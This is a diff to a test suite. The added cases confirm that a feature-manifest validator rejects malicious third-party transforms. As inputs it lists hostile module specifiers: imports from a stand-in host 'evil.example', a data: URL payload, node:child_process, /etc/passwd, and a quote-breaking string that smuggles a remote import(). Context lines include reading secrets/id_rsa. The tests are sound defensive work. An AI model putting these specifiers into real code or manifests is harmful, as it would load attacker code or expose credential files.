@@ -174,6 +174,52 @@ describe('malicious third-party features are rejected', () => {
     }
   });
 
+  it('module specifiers that are URLs, protocols or absolute paths', () => {
+    for (const from of [
+      'https://evil.example/x.js',
+      '//evil.example/x.js',
+      'data:text/javascript,alert(1)',
+      'node:child_process',
+      'file:///etc/passwd',
+      '/etc/passwd',
+      "x';import('https://evil.example/x.js');//",
+      'a b',
+      '',
+      'a\\b',
+    ]) {
+      for (const op of [
+        { op: 'add-import', file: 'src/a.ts', from },
+        { op: 'wrap-provider', file: 'src/a.tsx', component: 'P', from },
+        { op: 'add-boot-step', file: 'src/a.ts', call: 'go', from },
+        { op: 'add-route', file: 'src/a.ts', path: '/x', component: 'X', from },
+      ]) {
+        const error = third({ transforms: [op] });
+        expect(error.code, `${op.op} ${from}`).toMatch(/^MFEFLOW_E20[23]$/);
+      }
+    }
+  });
+
+  it('accepts package, relative and alias module specifiers', () => {
+    for (const from of [
+      'react',
+      '@scope/pkg',
+      '@scope/pkg/sub',
+      './a',
+      '../a/b',
+      '..',
+      '@/lib/x',
+    ]) {
+      const manifest = text({ transforms: [{ op: 'add-import', file: 'src/a.ts', from }] });
+      expect(() => parseFeature(manifest, 'third-party', 'x'), from).not.toThrow();
+    }
+  });
+
+  it('prop names that are not JSX attribute names', () => {
+    const op = { op: 'wrap-provider', file: 'src/a.tsx', component: 'P', from: 'x' };
+    const error = third({ transforms: [{ ...op, props: { 'a b': 1 } }] });
+    expect(error.code).toBe('MFEFLOW_E203');
+  });
+
   it('files read from the local disk', () => {
     expect(third({ files: [{ to: 'stolen.txt', from: 'secrets/id_rsa' }] }).code).toBe(
       'MFEFLOW_E203',
